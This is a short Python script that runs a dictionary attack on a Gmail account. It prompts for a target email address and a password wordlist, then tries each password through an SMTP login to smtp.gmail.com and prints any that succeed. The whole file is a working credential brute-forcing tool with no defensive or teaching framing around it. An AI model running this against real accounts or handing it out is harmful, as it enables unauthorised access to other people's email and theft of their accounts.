#!/usr/bin/python

import smtplib
from termcolor import colored

smtserver = smtplib.SMTP("smtp.gmail.com", 587)
smtserver.ehlo()
smtserver.starttls()

user = input("[*] Enter Target EmailAddress : ")
passwdfile = input("[*] Enter the Path to password file")
file = open(passwdfile, "r")

for password in file :
    try:
        smtserver.login(user,password)
        print(colored("[+] Password found %s " %password , "green"))
    except smtplib.SMTPAuthenticationError:
        print(colored("[+] Wrong found %s " %password , "red"))
